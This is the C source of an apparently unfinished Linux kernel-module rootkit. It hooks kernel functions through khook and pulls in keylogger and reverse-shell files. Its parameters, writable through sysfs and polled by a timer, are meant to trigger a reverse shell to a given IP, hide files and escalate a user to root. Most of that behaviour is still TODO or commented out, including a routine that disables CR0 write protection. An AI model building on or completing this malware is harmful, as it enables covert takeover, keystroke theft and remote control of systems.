/**
 * @file    rootkit.c
 * @author  Aaron Lichtman, Arch Gupta
 * @brief   A rootkit. TODO: Expand description
 */
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/timer.h>
#include <linux/jiffies.h>
#include "arsenal/keylogger.c"
#include "arsenal/reverse-shell.c"
#include "khook/engine.c"

MODULE_AUTHOR("Aaron Lichtman");
MODULE_AUTHOR("Arch Gupta");
MODULE_DESCRIPTION("Linux rootkit.");
MODULE_VERSION("0.1");
MODULE_LICENSE("GPL"); // So the kernel doesn't complain about proprietary code

/**
 * Data structures
 */

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
	typedef struct legacy_timer_emu {
		struct timer_list t;
		void (*function)(unsigned long);
		unsigned long data;
	} _timer;
#else
	typedef struct timer_list _timer;
#endif

struct commands {
    // TODO: Add properties for each of the commands we can accept
    char* rev_shell_ip;
    // etc
} commands;

/**
 * Global defines and variables.
 */

#define POLLING_INTERVAL 300
static _timer polling_timer;
struct commands cmds;

/**
 * Module parameters are made writable by anyone.
 * Any interaction with the rootkit will be through a command like:
 * $ echo "1" > /sys/module/garden/parameters/get_root. This will
 * update the value of the get_root parameter. We can poll this value
 * intermittently and do things when it changes.
 **/

static char* rev_shell_ip = NULL;
module_param(rev_shell_ip, charp, 0770);
MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
static char* hidden_file_prefix = NULL;
module_param(hidden_file_prefix, charp, 0770);
MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
static bool escalate_privileges = false;
module_param(escalate_privileges, bool, 0770);
MODULE_PARM_DESC(escalate_privileges, "Toggle for escalating current user to root.");

/**
 * Forward declarations
 */

static void poll_for_commands(unsigned long data);


// TODO: Figure out if this is needed at all.
// /**
//  * Overwrite the 16th bit in the CR0 register to disable write protection.
//  */
// void disable_write_protection() {
//     unsigned long value;
//     asm volatile("mov %%cr0,%0" : "=r"(value));
//     if (value & 0x00010000) {
//         value &= ~0x00010000;
//                 asm volatile("mov %0,%%cr0" ::"r"(value));
//     }
// }

/**
 * Syscall hooks
 */

/**
KHOOK(fget);
static int khook_fget(unsigned int fd) {
    int original = KHOOK_ORIGIN(fget, fd);
    printk("%s(%d) = %d\n", __func__, fd, original);
    return original;
}
**/

// Example hook for testing build process.
KHOOK(inode_permission);
static int khook_inode_permission(struct inode* inode, int mask) {
    int ret = 0;
    ret = KHOOK_ORIGIN(inode_permission, inode, mask);
    printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
    return ret;
}

/**
 * Timer and Command Polling Functions
 * Kernel v4.15 support adapted from: https://github.com/aircrack-ng/rtl8812au/commit/f221a169f281dab9756a176ec2abd91e0eba7d19
 */

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
static void legacy_timer_function_wrapper(struct timer_list *timer) {
	struct legacy_timer_emu *legacy_timer = from_timer(legacy_timer, timer, t);
    // legacy_timer->data is currently always NULL
	legacy_timer->function(legacy_timer->data);
}
#endif

__inline void timer_init_wrapper(_timer *timer, void* func) {
    timer->data = 0;
    timer->function = func;
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
	timer_setup(&timer->t, legacy_timer_function_wrapper, 0);
#else
	init_timer(timer);
#endif
}

__inline static void set_timer(_timer *timer) {
	unsigned long expires = jiffies + msecs_to_jiffies(POLLING_INTERVAL);
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
	mod_timer(&timer->t, expires);
#else
	mod_timer(timer, expires);
#endif
	printk("Timer configured to go off at %lu jiffies, in %lu msecs\n", expires, msecs_to_jiffies(POLLING_INTERVAL));
}

__inline static void timer_cleanup_wrapper(_timer *timer) {
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
    del_timer_sync(&timer->t);
#else
    del_timer_sync(timer);
#endif
}

/**
 * Check all parameters against last-known values and see if anything changed.
 * If yes, take the requested action.
 * Finally, start a timer to call this function again in the future.
 * NOTE: The data parameter is required in order for this to compile.
 */
static void poll_for_commands(unsigned long data) {
    // TODO: Store previous values of variables somewhere.
    printk(KERN_INFO "Polling for commands!\n");
    if (rev_shell_ip) {
        printk(KERN_INFO "rev_shell_ip: %s\n", rev_shell_ip);
        // TODO: Set up reverse shell.
    }

    if (hidden_file_prefix) {
        // TODO: Set up hidden files.
    }

    // if (escalate_privileges) {
    //     get_root();
    // }

    set_timer(&polling_timer);
}

/**
 * Rootkit module initialization.
 */
static int __init rootkit_init(void) {
    printk(KERN_INFO "Initializing rootkit...\n");
    khook_init();

    printk(KERN_INFO "Reading parameters...\n");
    // TODO: Populate cmds struct to be passed to poll_for_commands(data)
    cmds.rev_shell_ip = rev_shell_ip;

    printk(KERN_INFO "Initializing timer...\n");
    timer_init_wrapper(&polling_timer, poll_for_commands);
    set_timer(&polling_timer);

	// Gotta make the compiler happy.
	poll_for_commands(0);
    return 0;
}

/**
 * Called at exit. All cleanup should be done here.
 */
static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Cleaning up rootkit.\n");
    khook_cleanup();
    timer_cleanup_wrapper(&polling_timer);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
